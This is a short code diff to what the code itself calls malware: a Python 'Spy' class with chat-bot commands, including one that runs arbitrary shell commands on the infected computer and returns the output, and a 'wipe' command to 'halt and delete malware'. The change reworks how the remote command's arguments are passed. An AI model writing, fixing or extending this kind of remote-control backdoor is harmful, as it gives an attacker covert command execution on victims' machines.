@@ -78,8 +78,8 @@ class Spy:
         os.remove(path)
 
     @Bot.command(help="Send command to computer")
-    async def cmd(ctx, *args) -> None:
-        await Spy.Debug('\n\n'.join(await Spy.RunCommand(' '.join(args))).strip() or "No output")
+    async def cmd(ctx, *, args) -> None:
+        await Spy.Debug('\n\n'.join(await Spy.RunCommand(args)).strip() or "No output")
 
     @Bot.command(help="Halt and delete malware")
     async def wipe(ctx) -> None:
